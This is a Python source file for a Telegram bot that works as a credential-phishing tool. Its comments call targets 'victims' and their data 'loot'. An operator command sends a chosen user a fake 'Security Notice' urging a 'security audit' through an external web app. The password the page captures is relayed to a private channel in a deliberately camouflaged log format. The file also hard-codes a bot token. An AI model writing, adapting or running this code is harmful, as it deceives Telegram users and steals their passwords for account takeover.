import os
import json
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = "8521772281:AAFJplbFCHluunPVC17sNgM0Hjg7xsTd3Zw"
ADMIN_ID = 8699819680
LOOT_CHANNEL_ID = -1003817774248
TMA_URL = "https://pawsofjoy.github.io/tma-auditor/"

# Database to link @usernames to their internal Telegram Chat IDs
# Note: In a production environment, use a database like SQLite or PostgreSQL.
user_db = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    username = f"@{user.username}" if user.username else str(user.id)
    
    # Store the victim's ID so we can message them later
    user_db[username] = update.effective_chat.id
    
    if user.id == ADMIN_ID:
        await update.message.reply_text("💠 Admin Command Center Active.\nUse `/trigger @username` to send the audit.")
    else:
        # What the victim sees. You should delete this message after setup.
        await update.message.reply_text("System: Initiating secure session... Please wait.")

async def trigger_audit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Security: Only YOU can trigger the bot
    if update.effective_user.id != ADMIN_ID:
        return

    if not context.args:
        await update.message.reply_text("Usage: `/trigger @username`")
        return

    target = context.args
    if target in user_db:
        chat_id = user_db[target]
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("Start Security Audit", web_app=WebAppInfo(url=TMA_URL))]
        ])
        await context.bot.send_message(
            chat_id=chat_id, 
            text="⚠️ **Security Notice**\nAn administrative audit is required for this account to maintain channel integrity.",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
        await update.message.reply_text(f"✅ Audit link sent to {target}")
    else:
        await update.message.reply_text(f"❌ User {target} not found in database. Did you run /start on their account?")

async def capture_loot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # This catches the 'tg.sendData(pswd)' from your index.html
    pswd_data = update.effective_message.web_app_data.data
    user = update.effective_user
    username = user.username or "Unknown"
    
    # Format: vtm/pswd/[last 5 words of username]/[result]
    suffix = username[-5:] if len(username) >= 5 else username
    camouflaged_log = f"vtm/pswd/{suffix}/{pswd_data}"
    
    # Send exclusively to your private channel
    await context.bot.send_message(chat_id=LOOT_CHANNEL_ID, text=f"`{camouflaged_log}`", parse_mode="MarkdownV2")

def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("trigger", trigger_audit))
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, capture_loot))
    
    print("Bot is live and listening...")
    app.run_polling()

if __name__ == '__main__':
    main()
